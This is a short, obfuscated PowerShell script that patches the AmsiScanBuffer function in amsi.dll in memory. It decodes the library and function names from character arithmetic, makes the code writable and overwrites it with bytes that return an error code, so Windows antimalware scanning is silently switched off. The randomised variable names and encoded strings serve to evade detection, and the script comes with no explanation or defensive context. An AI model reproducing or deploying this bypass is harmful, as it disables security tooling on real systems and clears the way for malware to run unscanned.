$j85YI = @"
using System;
using System.Runtime.InteropServices;
public class j85YI {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ctZ9, string tRiuXSKNn22vdWRNpk);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr AS49oXxx59kK243R, UIntPtr ZSDUlivUCaWSovaXutv, uint SBz9REUXXApDTABn, out uint e3Q);
}
"@

Add-Type $j85YI

$EEdPmG = [j85YI]::LoadLibrary("$([CHAr]([bYTe]0x61)+[cHaR]([bYTE]0x6d)+[chAR](89+26)+[ChaR](105*5/5)+[ChAr](46*14/14)+[ChAR]([byTe]0x64)+[cHAR]([ByTE]0x6c)+[ChaR]([BYTE]0x6c))")
$cRps4b5TXyM5 = [j85YI]::GetProcAddress($EEdPmG, "$([ChaR]([ByTe]0x41)+[cHAR]([bYTE]0x6d)+[Char](115*67/67)+[chaR]([byTE]0x69)+[ChAr]([BYTE]0x53)+[CHar]([bYte]0x63)+[ChaR](97*13/13)+[chaR]([ByTE]0x6e)+[chAr]([bYTe]0x42)+[ChaR]([ByTE]0x75)+[CHAr](25+77)+[cHaR](102*27/27)+[Char](101)+[cHAR](114))")
$p = 0
[j85YI]::VirtualProtect($cRps4b5TXyM5, [uint32]5, 0x40, [ref]$p)
$e6JuGjFN5IKIK6YigE = "0xB8"
$xo3Lqe4yirap = "0x57"
$ZIS = "0x00"
$BgfkUcwdi = "0x07"
$L05FHj53032 = "0x80"
$dtZ = "0xC3"
$iUJ = [Byte[]] ($e6JuGjFN5IKIK6YigE,$xo3Lqe4yirap,$ZIS,$BgfkUcwdi,+$L05FHj53032,+$dtZ)
[System.Runtime.InteropServices.Marshal]::Copy($iUJ, 0, $cRps4b5TXyM5, 6)